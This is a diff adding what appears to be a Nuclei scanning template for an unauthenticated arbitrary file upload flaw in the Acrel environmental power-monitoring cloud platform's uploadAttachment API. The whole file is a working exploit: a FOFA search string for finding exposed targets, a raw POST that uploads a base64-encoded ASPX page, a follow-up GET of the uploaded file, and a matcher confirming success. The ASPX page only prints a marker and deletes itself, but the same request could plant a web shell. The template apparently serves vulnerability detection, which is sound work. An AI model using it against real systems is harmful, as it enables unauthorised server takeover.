@@ -1,0 +1,42 @@
+id: AnKeRuiHuanBaoYongDianJianGuanYunPingTai-uploadAttachment-File-Upload
+
+info:
+  name: 安科瑞环保用电监管云平台 uploadAttachment 任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |
+    fofa: body="myCss/phone.css"
+    安科瑞环保用电监管云平台 /api/APP/uploadAttachment 接口存在任意文件上传漏洞，未经身份验证的攻击者可以通过该漏洞上传恶意脚本文件，从而控制目标服务器。
+  reference:
+    - 
+  tags: File Upload
+
+http:
+  - raw:
+      - |
+        POST /api/APP/uploadAttachment HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+        Content-Type: application/json
+
+        {"FileStr":"PCVAUGFnZSBMYW5ndWFnZT0iQyMiJT48JVJlc3BvbnNlLldyaXRlKCJwYm95am5ucmZpcG1wbHN1a2RlY3p1ZHNlZnhteXdlIik7U3lzdGVtLklPLkZpbGUuRGVsZXRlKFJlcXVlc3QuUGh5c2ljYWxQYXRoKTslPg==","FileFormat":"aspx"}
+
+      - |
+        GET {{upload_path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+
+    extractors:
+      - type: regex
+        part: body_1
+        name: upload_path
+        group: 1
+        regex:
+          - '"path":"([^"]+\.aspx)"'
+        internal: true
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
